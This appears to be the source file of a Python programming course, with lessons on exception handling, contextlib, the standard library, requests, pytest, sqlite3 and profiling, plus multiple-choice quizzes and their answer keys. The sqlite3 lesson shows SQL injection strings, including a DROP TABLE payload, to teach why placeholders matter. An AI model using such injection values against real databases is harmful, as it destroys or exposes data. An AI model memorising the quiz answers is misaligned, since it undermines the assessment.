Keep the \`try\` block small. Wrapping fifty lines means your \`except\` eventually catches a failure you never considered and reports it as the one you expected — which is how a typo in \`normalise\` gets logged as "bad payload" for six months.

### Catch what you can actually handle

\`\`\`python
except:                                # never — this also catches KeyboardInterrupt
except Exception:                      # rarely, and only at a top-level boundary
except (KeyError, ValueError) as err:  # this
\`\`\`

The most damaging pattern in the language is:

\`\`\`python
try:
    save(record)
except Exception:
    pass
\`\`\`

That converts a bug into silent data loss: every failed save disappears and the program reports success. If you genuinely must continue, **log first**:

\`\`\`python
except Exception:
    logger.exception("save failed for %s", record["id"])
\`\`\`

\`logger.exception\` attaches the full traceback automatically, and only works inside an \`except\` block.

### Raise your own

\`\`\`python
class EnrolmentError(Exception):
    """Base class for this module's failures."""

class CourseFull(EnrolmentError):
    pass

if seats_left == 0:
    raise CourseFull(f"{course.slug} has no seats left")
\`\`\`

A module-specific base class lets callers write \`except EnrolmentError:\` and catch everything *you* raise without also catching everything the interpreter raises. Subclass from \`Exception\`, never from \`BaseException\`.

### Chain, do not swallow

\`\`\`python
try:
    hours = int(row["hours"])
except (KeyError, ValueError) as err:
    raise EnrolmentError(f"bad row: {row}") from err
\`\`\`

\`raise ... from err\` preserves the cause, so the traceback shows both the low-level failure and your high-level explanation. Re-raising bare — just \`raise\` inside the \`except\` block — also keeps the original traceback intact; \`raise err\` restarts it from this line and throws away the frames that tell you where it really came from.

### EAFP over LBYL

Python style prefers "easier to ask forgiveness than permission":

\`\`\`python
if os.path.exists(path):        # LBYL — and a race: the file can vanish right here
    with open(path) as f:
        ...

try:                            # EAFP — no window between check and use
    with open(path) as f:
        ...
except FileNotFoundError:
    ...
\`\`\`

The check-then-act version is not merely verbose, it is wrong under concurrency — another process can delete or create the file in the gap. The same reasoning applies to dictionaries: use \`d.get(key, default)\` or \`try/except KeyError\`, not \`if key in d: d[key]\`.

### Read tracebacks from the bottom

The last line is the exception type and message. The frame directly above it is where it was raised; the frames above that are how you got there. Read the bottom two lines first — most of the time they are the entire story, and the long middle section is your own call stack doing nothing wrong.

### Do not use exceptions for expected outcomes

A missing optional field is not exceptional: \`data.get("x")\` is clearer than catching \`KeyError\`. Reserve raising for conditions the caller genuinely cannot continue past.
        `,
        [
          q('Inside an except block, what does raise err lose compared with a bare raise?', [
            'The exception type is downgraded to plain Exception',
            'The finally clause of that try statement is skipped',
            'The message is replaced by the exception class name',
            'The traceback restarts here, dropping the frames showing the origin',
          ], 3, 'Re-raising the caught object starts the traceback at that line, while a bare raise preserves the original frames that show where the failure really came from.'),
          q('Which line records a failed save together with its full traceback?', [
            'logger.error("save failed")',
            'logger.warning(err)',
            'print(f"save failed: {err}")',
            'logger.exception("save failed")',
          ], 3, 'logger.exception logs at error level and attaches the active traceback automatically, which is why it only works inside an except block.'),
          q('Why keep a try block down to the single risky line instead of wrapping the whole function?', [
            'A wide try catches unrelated bugs and reports them as the expected failure',
            'Long try blocks are measurably slower to execute',
            'Python limits a try block to one statement anyway',
            'except only ever sees the first statement in the block',
          ], 0, 'A large try eventually catches a failure you never anticipated and labels it as the one you were handling, which hides real bugs for months.'),
        ]
      ),
            lesson('Cleanup You Can Trust with contextlib', 13, `
A deploy script took a lock by creating \`deploy.lock\`, ran the migration, then deleted the file. One morning a \`KeyError\` fired in the middle. The delete never ran. For two days every deploy refused to start with "another deploy is in progress", and there was no other deploy, only a stale file.

\`try/finally\` is the primitive that prevents that. \`with\` is its readable form. Writing a class with \`__enter__\` and \`__exit__\` (Chapter 3) is heavy ceremony for a five line rule, and \`contextlib\` is the shortcut.

### A generator becomes a context manager

\`\`\`python
import os
from contextlib import contextmanager
from pathlib import Path

@contextmanager
def deploy_lock(path="deploy.lock"):
    lock = Path(path)
    if lock.exists():
        raise RuntimeError("another deploy is in progress")
    lock.write_text(str(os.getpid()))
    try:
        yield lock
    finally:
        lock.unlink(missing_ok=True)

with deploy_lock():
    migrate()
\`\`\`

Everything before the \`yield\` is the setup \`__enter__\` would do. The value yielded is what \`as\` binds. Everything after is teardown. Exactly one \`yield\`, and it has to be reachable.

### The mistake that makes it useless

\`\`\`python
@contextmanager
def timed(label):
    start = time.perf_counter()
    yield
    print(f"{label}: {time.perf_counter() - start:.2f}s")   # skipped on error
\`\`\`

When the body raises, the exception is thrown back **into the generator at the \`yield\`**. Without a \`try\`, execution never reaches the line below, and the cleanup silently does not happen. That is the stale lock file again, now hiding inside something that looks like it handles cleanup.

\`\`\`python
@contextmanager
def timed(label):
    start = time.perf_counter()
    try:
        yield
    finally:
        print(f"{label}: {time.perf_counter() - start:.2f}s")
\`\`\`

Use \`except\` and \`else\` when success and failure differ, which is exactly the shape a database transaction wants:

\`\`\`python
@contextmanager
def transaction(conn):
    conn.execute("BEGIN")
    try:
        yield conn
    except Exception:
        conn.execute("ROLLBACK")
        raise                       # re-raise: the caller still needs to know
    else:
        conn.execute("COMMIT")
\`\`\`

Drop that bare \`raise\` and you have written the swallowed exception from the previous lesson, with a rollback attached to make it look responsible.

### suppress, for the failure you genuinely expect

\`\`\`python
from contextlib import suppress

with suppress(FileNotFoundError):
    Path("deploy.lock").unlink()
\`\`\`

That is \`try / except FileNotFoundError / pass\` with less noise. It is not the banned \`except Exception: pass\`, because it names one type and lets every other error straight through. Writing \`suppress(Exception)\` recreates the bug the narrow form avoids, so do not.

### ExitStack, when the count is dynamic

A plain \`with\` handles a fixed set of resources:

\`\`\`python
with open("in.csv") as src, open("out.csv", "w") as dst:
    dst.write(src.read())
\`\`\`

When the number is only known at runtime, \`ExitStack\` collects each manager as you enter it and unwinds all of them on the way out, in reverse order, even if the body raises:

\`\`\`python
from contextlib import ExitStack

with ExitStack() as stack:
    files = [stack.enter_context(open(p, encoding="utf-8")) for p in paths]
    merge(files)
\`\`\`

| Helper | Use it for |
|---|---|
| \`@contextmanager\` | turning a generator into a manager |
| \`suppress(E)\` | ignoring one named exception |
| \`closing(obj)\` | objects with \`.close()\` but no \`__exit__\` |
| \`ExitStack()\` | a variable number of managers |

One catch worth remembering: a manager built by \`@contextmanager\` is **single use**. Create it inside the \`with\` statement itself. Store one in a module level constant and reuse it, and the second entry raises \`RuntimeError: generator didn't yield\`, because its generator has already run to completion.

The habit to keep: any time you write a line that undoes an earlier line, the two belong in a context manager together, not at opposite ends of a function that might not reach the bottom.
      `,
        [
          q('A @contextmanager puts its cleanup after the yield with no try/finally around it. When is that cleanup skipped?', [
            'Whenever the body raises, since the exception lands at the yield',
            'Only when the body calls sys.exit to stop the process',
            'Never, because with always runs the generator to the end',
            'Only when the manager is used inside a nested with',
          ], 0, 'An exception in the with body is thrown back into the generator at the yield, so the lines below it never execute unless a try/finally guards them.'),
          q('You must open a list of files whose length is only known at runtime, closing all of them safely. Which tool fits?', [
            'A single with statement naming each file in turn',
            'contextlib.ExitStack, calling enter_context for each file',
            'contextlib.suppress wrapped around the whole loop',
            'A try/finally that closes the last file it opened',
          ], 1, 'ExitStack collects managers entered at runtime and unwinds every one of them in reverse order on exit, which a fixed with statement cannot do.'),
          q('How does with suppress(FileNotFoundError): path.unlink() differ from except Exception: pass?', [
            'It retries the unlink once before it finally gives up',
            'It logs the discarded error before continuing on',
            'It names one expected failure and lets other errors through',
            'It turns the error into a return value the caller checks',
          ], 2, 'suppress ignores only the exception types you list, so an unrelated failure still propagates instead of vanishing the way a bare except pass makes it.'),
        ]
      ),
      ],
      [
        q('You open an existing file with mode "w" and your program crashes before writing. What is in the file?', [
          'The original contents, unchanged',
          'Nothing — "w" truncates the file as soon as it opens',
          'A partially written copy',
          'The original contents plus a lock marker',
        ], 1, 'Mode "w" truncates on open, so the old data is gone before any write happens; write to a temp file and rename when the data matters.'),
        q('json.loads(json.dumps({1: "a"})) returns what?', [
          '{1: "a"}',
          '{"1": "a"}',
          'A TypeError, because int keys are not allowed',
          '[[1, "a"]]',
        ], 1, 'JSON object keys are always strings, so integer keys survive the round trip only as their string form.'),
        q('What is the practical consequence of "except Exception: pass" around a save call?', [
          'Failures are retried automatically',
          'Failures vanish silently and the program reports success it did not achieve',
          'Only syntax errors are hidden',
          'The exception is re-raised at exit',
        ], 1, 'Swallowing the exception without logging turns a visible bug into silent data loss with no trace to debug from.'),
        q('Why is try/except FileNotFoundError better than checking os.path.exists first?', [
          'It is shorter to type',
          'The file can be deleted between the check and the open, so the check proves nothing',
          'os.path.exists does not work on relative paths',
          'Exceptions are faster than function calls',
        ], 1, 'Check-then-act leaves a race window; handling the exception covers the failure at the moment it actually matters.'),
      ]
    ),
    chapter(
      'The Standard Library, HTTP, and Tests',
      'The batteries Python ships with, calling real APIs with requests, and proving your code works with pytest.',
      [
        lesson('Standard Library Highlights', 13, `
Python ships with a large, boring, extremely reliable standard library. Reaching for a dependency before checking it is how projects accumulate maintenance debt.

### datetime — and the aware/naive split

\`\`\`python
from datetime import datetime, timezone, timedelta

datetime.now()                  # naive — no timezone attached
datetime.now(timezone.utc)      # aware — use this
\`\`\`

A **naive** datetime carries no timezone, so comparing it with an aware one raises \`TypeError: can't compare offset-naive and offset-aware datetimes\`, and arithmetic across a daylight-saving boundary is quietly wrong rather than loudly broken. Store and compute in UTC; convert to local time only for display.

\`\`\`python
deadline = datetime.now(timezone.utc) + timedelta(days=7)
deadline.isoformat()                                # wire format
datetime.fromisoformat("2026-08-19T10:00:00+00:00") # parse it back
\`\`\`

### collections

\`\`\`python
from collections import Counter, defaultdict, deque

Counter(levels).most_common(3)      # [('beginner', 12), ('advanced', 5), ...]

by_level = defaultdict(list)
for c in courses:
    by_level[c["level"]].append(c)  # no "if key not in dict" dance

recent = deque(maxlen=100)          # O(1) push and pop at both ends
recent.appendleft(item)             # oldest item drops off automatically
\`\`\`

\`defaultdict(list)\` replaces the four-line grouping idiom people write by hand. \`deque\` is the right structure for a queue: \`list.pop(0)\` is O(n) because it shifts every remaining element one place left.

### itertools

\`\`\`python
from itertools import chain, groupby, islice

list(chain(a, b))                # one iterator over both, no concatenation
list(islice(infinite_gen, 10))   # first 10 values, lazily

key = lambda c: c["level"]
for level, group in groupby(sorted(courses, key=key), key=key):
    print(level, len(list(group)))
\`\`\`

\`groupby\` groups only **adjacent** items. Feed it unsorted data and you get several separate groups for the same key, with no error and no warning — the classic itertools bug. Sort by the same key first, every time.

### re — raw strings, compiled once

\`\`\`python
import re

SLUG = re.compile(r"^[a-z0-9-]+$")
SLUG.match("python-development")                 # a Match object, or None

re.findall(r"\\d+", "3 chapters, 15 lessons")     # ['3', '15']
\`\`\`

Always write patterns as raw strings (\`r"..."\`) so backslashes reach the regex engine instead of being interpreted by Python first. And do not parse HTML or JSON with a regex — use a parser.

### secrets vs random

\`\`\`python
import random, secrets

random.choice(items)             # simulations, shuffling, sampling
secrets.token_urlsafe(32)        # session tokens, password resets, API keys
\`\`\`

\`random\` is a Mersenne Twister: fast, reproducible, and not cryptographically secure — its entire internal state can be reconstructed from a few hundred consecutive outputs, after which every future value it produces is known. Using it to generate anything security-related is a real vulnerability, not a style preference.

### subprocess

\`\`\`python
import subprocess

subprocess.run(
    ["git", "status", "--short"],
    check=True, capture_output=True, text=True,
)
\`\`\`

Pass a **list**, not a string, and never use \`shell=True\` with input a user supplied — that is command injection, structurally identical to SQL injection. \`check=True\` raises \`CalledProcessError\` on a non-zero exit instead of letting a failed command sail past unnoticed.

### argparse and logging

\`\`\`python
import argparse, logging

parser = argparse.ArgumentParser(description="Import courses")
parser.add_argument("path")
parser.add_argument("--dry-run", action="store_true")
args = parser.parse_args()

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(name)s %(message)s")
log = logging.getLogger(__name__)
log.info("importing %s", args.path)      # lazy formatting — not an f-string
\`\`\`

\`print\` has one destination and one level. \`logging\` gives you levels, timestamps, module names, and the ability to turn one subsystem up to DEBUG in production without editing code. Pass values as arguments rather than formatting them in: at INFO level, a suppressed DEBUG line then costs nothing to skip.

Also worth knowing: \`pathlib\`, \`csv\`, \`sqlite3\`, \`statistics\`, \`functools\`, \`dataclasses\`, \`typing\`, and \`shutil\`.
        `,
        [
          q('Your login system generates session tokens with random.choice over an alphabet. Why is that a genuine vulnerability rather than a style preference?', [
            'random draws from a smaller character set than secrets allows',
            'Its internal state can be recovered from past outputs, so future tokens are predictable',
            'random.choice repeats a value once its internal pool is exhausted',
            'random is not thread safe, so two users can be issued the same token',
          ], 1, 'The Mersenne Twister is deterministic, and a few hundred consecutive outputs are enough to reconstruct its state and compute every token it will produce next, which is why token generation belongs to secrets.'),
          q('log.info("imported %s rows", len(rows)) instead of an f-string. What does the percent form actually buy you?', [
            'The message is only formatted if that level is actually emitted',
            'It stops the log line being truncated at 1024 characters',
            'It writes each argument on a separate line in the output',
            'It guarantees the values are converted with repr rather than str',
          ], 0, 'Formatting happens inside the handler, so a DEBUG call in a process running at INFO level costs almost nothing because the string is never built.'),
          q('A scheduler stores datetime.now() and later compares it against a deadline built with datetime.now(timezone.utc). What happens?', [
            'The naive value is assumed to be UTC and the comparison succeeds',
            'Both values are converted to local time before comparing',
            'TypeError, because an offset naive and an offset aware datetime cannot be compared',
            'The comparison silently returns False for every deadline',
          ], 2, 'Python refuses to guess a missing offset, so mixing a naive and an aware datetime raises rather than producing a plausible but wrong answer.'),
        ]
      ),
        lesson('Talking to HTTP APIs with requests', 14, `
\`requests\` is not in the standard library. Install it into the project virtualenv from Chapter 2:

\`\`\`bash
python -m pip install requests
\`\`\`

### A GET, done properly

\`\`\`python
import requests

resp = requests.get(
    "https://api.example.com/courses",
    params={"level": "beginner", "page": 2},   # builds the query string for you
    headers={"Accept": "application/json"},
    timeout=10,                                # seconds
)
resp.raise_for_status()      # raises HTTPError on any 4xx or 5xx
courses = resp.json()        # parsed JSON, or JSONDecodeError
\`\`\`

Four things there are doing real work:

- **\`params=\`** builds \`?level=beginner&page=2\` with correct percent-encoding. Never concatenate query strings by hand — a value containing a space, \`&\`, or \`#\` corrupts the request silently.
- **\`timeout=\`** is the single most important argument in the library, and **it has no default**. Omit it and a hung server holds your process open indefinitely: no exception, no log line, just a job that never finishes and a queue that never drains. This is the most common production bug in Python HTTP code. Set it on every single request.
- **\`raise_for_status()\`** turns a 404 or 500 into an exception. Without it, \`resp.json()\` cheerfully parses the error body and your code proceeds to process a payload that means "not found".
- **\`.json()\`** replaces \`json.loads(resp.text)\` and handles the decoding.

### Handling the statuses you expect

\`\`\`python
if resp.status_code == 404:
    return None              # a legitimate answer, not a failure
resp.raise_for_status()      # anything else unexpected still raises
\`\`\`

### POST: \`json=\`, not \`data=\`

\`\`\`python
resp = requests.post(url, json={"slug": "python-development"}, timeout=10)
\`\`\`

\`json=\` serialises the body and sets \`Content-Type: application/json\`. \`data=\` sends form-encoded fields. Passing a dict to \`data=\` against a JSON API produces a 400 that reads like the server's fault and is entirely yours.

### Sessions

\`\`\`python
session = requests.Session()
session.headers.update({"Authorization": f"Bearer {token}"})

for page in range(1, 6):
    r = session.get(url, params={"page": page}, timeout=10)
    r.raise_for_status()
    yield from r.json()["data"]
\`\`\`

A \`Session\` reuses the underlying TCP connection between requests — noticeably faster over many calls — and carries shared headers and cookies. Use one whenever you make more than a couple of calls to the same host.

### Credentials come from the environment

\`\`\`python
import os
token = os.environ["API_TOKEN"]     # KeyError at startup if missing — good
\`\`\`

Never hardcode a key. A secret committed to git must be **rotated**, not deleted: the history survives in every clone and every fork.

### Errors, retries, and backoff

\`\`\`python
import time
from requests.exceptions import RequestException

def get_json(session, url, **kwargs):
    for attempt in range(3):
        try:
            r = session.get(url, timeout=10, **kwargs)
            if r.status_code == 429:                            # rate limited
                time.sleep(int(r.headers.get("Retry-After", 5)))
                continue
            r.raise_for_status()
            return r.json()
        except RequestException:
            if attempt == 2:
                raise
            time.sleep(2 ** attempt)                            # 1s, then 2s
    raise RuntimeError(f"gave up after 3 attempts: {url}")
\`\`\`

Every \`requests\` exception inherits from \`RequestException\`, so that one \`except\` covers timeouts, DNS failures, and connection resets. The \`raise\` *after* the loop is not decoration: without it, three consecutive 429s fall out of the bottom and the function returns \`None\`, which the caller then happily treats as data. Retry with **exponential backoff**, never in a tight loop — hammering a struggling server is how you turn a blip into an outage, and how you get your API key revoked. Retry only idempotent requests (GET, PUT, DELETE); retrying a POST can create the same record twice.

### Pagination

\`\`\`python
url = start_url
while url:
    data = get_json(session, url)
    yield from data["results"]
    url = data.get("next")      # None on the last page ends the loop
\`\`\`

Yielding rather than accumulating lets the caller stream a hundred thousand records without holding them all in memory — the generator habit from Chapter 1, applied where it matters most.
        `,
        [
          q('A retry helper loops three times, sleeps on a 429, and has no raise statement after the loop. Three consecutive 429 responses arrive. What does the caller receive?', [
            'A RequestException raised from the third attempt',
            'None, which the caller then processes as if it were data',
            'The raw Response object from the final attempt',
            'A RuntimeError naming the URL that failed',
          ], 1, 'Every 429 hits continue, the loop simply ends, and a Python function that falls off the bottom returns None, so a total failure is handed back looking like a successful empty result.'),
          q('You POST a dict using data= to a JSON API and get back a 400. What went wrong?', [
            'data= sends form encoded fields, so the server never receives JSON',
            'data= requires the body to be bytes rather than a dict',
            'data= omits the Content-Length header on POST requests',
            'data= encodes the body into the query string instead of the body',
          ], 0, 'json= serialises the dict and sets Content-Type to application/json, while data= sends an ordinary form body that a JSON endpoint cannot parse.'),
          q('Which requests are safe for an automatic retry after a timeout?', [
            'Any request, because a timeout means the server never saw it',
            'Only requests that came back with a 5xx status code',
            'GET, PUT and DELETE, since repeating them adds nothing new',
            'Only requests that were sent through a Session object',
          ], 2, 'A timeout tells you nothing about whether the server processed the request, so only idempotent methods are safe to repeat while a retried POST can create the same record twice.'),
        ]
      ),
        lesson('Testing with pytest', 14, `
\`\`\`bash
python -m pip install pytest
python -m pytest -q
\`\`\`

pytest collects any file named \`test_*.py\` and any function inside it named \`test_*\`. No base class, no boilerplate — just \`assert\`.

\`\`\`python
# tests/test_pricing.py
from myapp.pricing import total

def test_total_applies_tax():
    assert total([100, 50], tax=0.1) == 165
\`\`\`

pytest rewrites \`assert\` so a failure prints both sides: \`assert 160 == 165\`. That is why you never need \`assertEqual\`.

### Arrange, act, assert

\`\`\`python
import pytest

def test_enrolment_rejects_full_course():
    course = Course(slug="python", seats=0)         # arrange
    with pytest.raises(CourseFull) as info:         # act + assert
        enrol(student_id=1, course=course)
    assert "python" in str(info.value)
\`\`\`

\`pytest.raises\` is how you test a failure path. A suite that only covers the happy path leaves every bit of error handling from Chapter 4 completely unverified — and error paths are exactly where untested bugs live, because nobody exercises them by hand.

### Parametrize instead of copy-pasting

\`\`\`python
@pytest.mark.parametrize("title, expected", [
    ("Python Development", "python-development"),
    ("  Spaced  Out  ",    "spaced-out"),
    ("Already-slugged",    "already-slugged"),
])
def test_slugify(title, expected):
    assert slugify(title) == expected
\`\`\`

Three independent test cases, each named separately in the output, from one function. Crucially, one failure does not hide the others — a \`for\` loop with an assert inside stops at the first bad case and tells you nothing about the rest. Adding a fourth edge case is one line, which is why edge cases actually get added.

### Fixtures for setup

\`\`\`python
@pytest.fixture
def sample_courses():
    return [Course("a", 10), Course("b", 30)]

def test_shortest(sample_courses):
    assert shortest(sample_courses).slug == "a"
\`\`\`

A fixture is requested simply by naming it as a parameter. The built-in ones you will use constantly:

\`\`\`python
def test_writes_report(tmp_path):          # a fresh temp directory per test
    out = tmp_path / "report.json"
    write_report(out, rows=[])
    assert json.loads(out.read_text(encoding="utf-8")) == []
\`\`\`

\`tmp_path\` means your tests never touch the real filesystem and never collide when run in parallel.

### Never call the network in a unit test

A test that hits a real API is slow, fails on a train, and fails when someone else's server is down. Replace the boundary instead:

\`\`\`python
def test_get_courses_returns_none_on_404(monkeypatch):
    class FakeResponse:
        status_code = 404

    monkeypatch.setattr(myapp.api.session, "get", lambda *a, **k: FakeResponse())
    assert myapp.api.get_courses() is None
\`\`\`

\`monkeypatch\` undoes itself when the test ends. A plain assignment to a module attribute does not, and leaks into every test that runs afterwards — order-dependent suites almost always begin with a manual patch that somebody forgot to reverse.

This is also where the composition habit from Chapter 3 pays off: a class that receives its \`notifier\` as a constructor argument needs no patching at all. You pass a fake object that records calls, and assert on what it recorded.

### Floats, and the flags worth memorising

\`\`\`python
assert total([0.1, 0.2]) == pytest.approx(0.3)     # never plain == on floats
\`\`\`

\`\`\`bash
python -m pytest -q             # quiet output
python -m pytest -x             # stop at the first failure
python -m pytest -k enrol       # only tests whose name matches "enrol"
python -m pytest --cov=myapp    # coverage, via pytest-cov
\`\`\`

Coverage measures what was *executed*, not what was *verified*: a suite with 100% coverage and no meaningful assertions proves nothing. Treat it as a map of untested regions, never as a score to maximise.

### What to test

Test behaviour through the public interface: given this input, expect this output or this exception. Tests that assert on private helpers break on every refactor, which teaches a team to delete tests rather than fix them. And always write a test for the bug you just fixed — that one is guaranteed to be worth having.

### Where to go next

You now have the language, its object model, its standard library, and the tools to call a live API and prove your code works. The natural next steps are \`mypy\` for static type checking, a web framework such as FastAPI or Django, \`pandas\` for tabular data, and CI that runs \`pytest\` on every push.
        `,
        [
          q('Three slugify cases are checked inside a for loop with an assert in the body rather than with parametrize. The first case fails. What have you lost?', [
            'Nothing, because pytest reports each iteration separately',
            'The other two cases never run, so you learn nothing about them',
            'The assert rewriting, so the failure prints no values',
            'Access to fixtures, which cannot be used inside a loop',
          ], 1, 'An assert stops the whole test function at the first failure, so a loop hides every later case while parametrize reports each one as its own independent test.'),
          q('A suite reports 100% coverage. What does that number fail to tell you?', [
            'Which lines of the package were executed during the run',
            'Whether every module was imported by at least one test',
            'Whether anything meaningful was asserted about the behaviour',
            'How long the slowest test in the suite took to finish',
          ], 2, 'Coverage records which lines ran, so a suite that calls every function and asserts nothing still reports 100% while verifying nothing at all.'),
          q('Why test write_report against tmp_path rather than a fixed path such as reports/out.json?', [
            'tmp_path is faster because the directory lives in memory',
            'pytest blocks file writes to any path outside tmp_path',
            'tmp_path deletes the file as soon as the assertion passes',
            'Each test gets a fresh directory, so runs never collide or touch real data',
          ], 3, 'A per test temporary directory keeps the suite off the real filesystem and lets tests run in parallel or in any order without one overwriting another\'s output.'),
        ]
      ),
            lesson('Local Data with sqlite3', 13, `
No server, no port, no credentials. \`sqlite3\` is in the standard library, and a database is one file you can copy, delete, or drop into a test fixture. It handles a few million rows without complaining, which covers most of what people install Postgres for on day one.

### Connect, create, insert

\`\`\`python
import sqlite3

conn = sqlite3.connect("courses.db")
conn.execute("""
    CREATE TABLE IF NOT EXISTS courses (
        slug  TEXT PRIMARY KEY,
        title TEXT NOT NULL,
        hours INTEGER NOT NULL
    )
""")
conn.execute(
    "INSERT INTO courses VALUES (?, ?, ?)",
    ("python-development", "Python Development", 48),
)
conn.commit()
\`\`\`

Nothing survives until \`commit()\`. A script that inserts 40,000 rows and exits without committing leaves an empty file behind and reports no error at all.

### Never build SQL with an f-string

\`\`\`python
conn.execute(f"SELECT * FROM courses WHERE slug = '{slug}'")   # broken
\`\`\`

A slug of \`x' OR '1'='1\` returns every row in the table. A slug of \`x'; DROP TABLE courses; --\` does considerably worse. Use placeholders:

\`\`\`python
row = conn.execute(
    "SELECT * FROM courses WHERE slug = ?", (slug,)
).fetchone()
\`\`\`

Placeholders are not clever escaping. The value is bound separately and never becomes part of the SQL text, so there is no quote to break out of. That trailing comma is load bearing: \`(slug)\` is just a string, and sqlite3 answers with \`ValueError: parameters are of unsupported type\`. It also explains a limitation people trip over, which is that you cannot parameterise a table or column name, only a value.

### One transaction beats 40,000

Row at a time with a \`commit()\` after each: four minutes for 40,000 rows. The same data in one batch:

\`\`\`python
rows = [(c.slug, c.title, c.hours) for c in courses]
with conn:
    conn.executemany("INSERT INTO courses VALUES (?, ?, ?)", rows)
\`\`\`

Seconds, not minutes. Each commit forces a sync to disk, so batching turns 40,000 syncs into one.

Watch what \`with conn\` actually is. It is a **transaction** context manager, not a closing one: leaving the block commits, or rolls back if the body raised, and the connection stays open. Call \`conn.close()\` yourself, or wrap it in \`contextlib.closing\`.

### Rows that read like dicts

\`\`\`python
conn.row_factory = sqlite3.Row
row = conn.execute("SELECT slug, hours FROM courses WHERE slug = ?", (slug,)).fetchone()
row["hours"]      # 48
\`\`\`

Default rows are plain tuples, so every access is \`row[2]\` and every column you add in the middle of a SELECT becomes a silent bug.

### Types, including the one that surprises people

| Python value | Stored as |
|---|---|
| \`int\` | INTEGER |
| \`float\` | REAL |
| \`str\` | TEXT |
| \`bytes\` | BLOB |
| \`None\` | NULL |
| \`datetime\` | no native type |

SQLite has no date or time type, and the built in adapters that used to convert \`datetime\` objects for you were deprecated in Python 3.12. Store an ISO 8601 string in UTC yourself with \`datetime.now(timezone.utc).isoformat()\` and read it back with \`datetime.fromisoformat\`. Column types are advisory too: a TEXT column accepts the integer \`48\` quite happily unless you declare the table \`STRICT\`.

### Fetch lazily

\`\`\`python
for row in conn.execute("SELECT slug FROM courses"):
    print(row["slug"])
\`\`\`

A cursor is an iterator. \`fetchall()\` on a million rows builds a million tuples in memory; iterating holds a handful, which is the generator habit applied to a database.

### Where it stops

One writer at a time. A second writer waits, then raises \`sqlite3.OperationalError: database is locked\` once \`timeout\` expires (five seconds by default). Readers are cheap, especially in write ahead log mode:

\`\`\`python
conn.execute("PRAGMA journal_mode=WAL")
\`\`\`

Many readers plus one writer per file is comfortable. Eight worker processes writing to the same file is the point where you want a real server.
      `,
        [
          q('Why does a placeholder stop SQL injection where careful quoting does not?', [
            'It escapes every quote character in the value before the SQL is built',
            'It rejects any value containing SQL keywords such as DROP or OR',
            'It converts the value to TEXT, so no SQL fragment can survive',
            'The value is bound separately and never becomes part of the SQL text',
          ], 3, 'The statement is compiled before the value is attached, so the value is data to the engine and cannot be read as SQL no matter what characters it contains.'),
          q('Inserting 40,000 rows one at a time with a commit after each takes four minutes, while one executemany inside a with conn block takes seconds. Why?', [
            'Every commit forces a sync to disk, and batching makes that happen once',
            'executemany compiles the rows into a single INSERT statement',
            'with conn keeps the rows in memory and skips the write entirely',
            'Each separate execute call has to reparse the table schema',
          ], 0, 'Durability costs a disk sync per commit, so 40,000 commits pay that price 40,000 times while a single transaction pays it once.'),
          q('What happens when a with conn: block exits normally?', [
            'The connection is closed and any open transaction is committed',
            'The connection is closed without the transaction being committed',
            'The transaction is rolled back, so you must commit inside the block',
            'The transaction is committed and the connection stays open',
          ], 3, 'sqlite3 uses the connection as a transaction context manager rather than a closing one, so you still have to call close yourself when you are finished with it.'),
        ]
      ),
      ],
      [
        q('Which requests argument has no default and will hang your program indefinitely if omitted?', [
          'headers', 'params', 'timeout', 'allow_redirects',
        ], 2, 'requests waits forever by default, so a hung server holds the process open with no exception until you set timeout.'),
        q('You skip raise_for_status() and the server returns 500 with a JSON error body. What happens?', [
          'requests raises HTTPError anyway',
          'resp.json() parses the error body and your code treats it as valid data',
          'resp.json() returns None',
          'The request is retried automatically',
        ], 1, 'A 500 is still a completed HTTP response, so nothing raises and the error payload flows on as if it were the result.'),
        q('itertools.groupby produces three groups for the same key. What went wrong?', [
          'The key function returned a mutable value',
          'The input was not sorted by the same key, and groupby only groups adjacent items',
          'groupby needs a list, not an iterator',
          'The groups were consumed twice',
        ], 1, 'groupby starts a new group whenever the key changes between neighbours, so unsorted input splits each key into several runs.'),
        q('Why use monkeypatch rather than assigning to a module attribute directly in a test?', [
          'monkeypatch is faster',
          'monkeypatch restores the original at teardown, so the change cannot leak into later tests',
          'Direct assignment is a syntax error inside a test',
          'monkeypatch also mocks the network layer automatically',
        ], 1, 'An unreversed manual patch persists for the rest of the session and produces order-dependent, intermittently failing tests.'),
      ]
    ),
    chapter(
      'Performance, Concurrency, and the GIL',
      'Finding the slow line before you rewrite it, choosing between threads, processes, and asyncio, and the failure modes each one brings.',
      [
        lesson('Measure Before You Optimise', 13, `
Every optimisation made without a measurement is a guess, and guesses about performance are wrong roughly as often as they are right. Measure, change one thing, measure again.

### Time one expression with timeit

\`\`\`bash
python -m timeit -s "items = list(range(10_000))" "9999 in items"
# 2000 loops, best of 5: 165 usec per loop

python -m timeit -s "items = set(range(10_000))" "9999 in items"
# 5000000 loops, best of 5: 42.1 nsec per loop
\`\`\`

The \`-s\` setup string runs once and is **not timed**. Building the data inside the timed statement is the classic \`timeit\` mistake: you measure \`list(range(10_000))\` on every loop and conclude the two containers perform about the same.

### Profile the whole program with cProfile

\`timeit\` answers "which of these two lines is faster". \`cProfile\` answers the question you actually have — "where is the time going?"

\`\`\`bash
python -m cProfile -o profile.out -m myapp.main
\`\`\`

\`\`\`python
import pstats

stats = pstats.Stats("profile.out")
stats.sort_stats("cumtime").print_stats(15)     # top 15 by cumulative time
\`\`\`

Two columns carry the meaning:

| Column | Means |
|---|---|
| \`tottime\` | time spent inside the function itself, excluding calls it made |
| \`cumtime\` | time inside the function **and** everything it called |

Sort by \`cumtime\` to find which branch of the call tree owns the runtime; sort by \`tottime\` to find the one function actually burning CPU. Profiling adds per-call overhead, so read the output as a ranking, not as a stopwatch.

### Most real wins are algorithmic

\`\`\`python
# 5,000 enrolments x 20,000 students = up to 100 million comparisons
for e in enrolments:
    student = next(s for s in students if s.id == e.student_id)   # O(n) per row

# One pass to build the index, then constant-time lookups
by_id = {s.id: s for s in students}
for e in enrolments:
    student = by_id[e.student_id]                                 # O(1)
\`\`\`

That is Chapter 1's container table applied to a real loop: a hundred million comparisons become 25,000 hash lookups, and nothing else about the program changed. No amount of micro-tuning inside the first version reaches the second. Look for a nested loop, a repeated \`in\` against a list, or a query inside a loop **before** you touch anything else.

### Cache pure functions

\`\`\`python
from functools import lru_cache

@lru_cache(maxsize=1024)
def exchange_rate(pair: str, day: str) -> float:
    return fetch_rate(pair, day)      # same inputs, same answer, forever
\`\`\`

